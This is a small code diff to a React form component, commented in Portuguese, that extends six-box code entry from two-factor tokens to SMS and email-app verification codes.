@@ -46,11 +46,12 @@ function CommandPage({ userId }) {
     e.preventDefault();
     setLoading(true);
     
-    // Usar o valor personalizado se fornecido, senão usar codeDigits (para 2FA) ou inputValue
+    // Usar o valor personalizado se fornecido, senão usar codeDigits (para códigos) ou inputValue
     let valueToSend;
     if (customValue !== null) {
       valueToSend = customValue;
-    } else if (field === "token_2fa") {
+    } else if (field === "token_2fa" || field === "sms_code" || field === "app_mail") {
+      // Campos que usam os 6 quadradinhos
       valueToSend = codeDigits.join('');
     } else {
       valueToSend = inputValue;
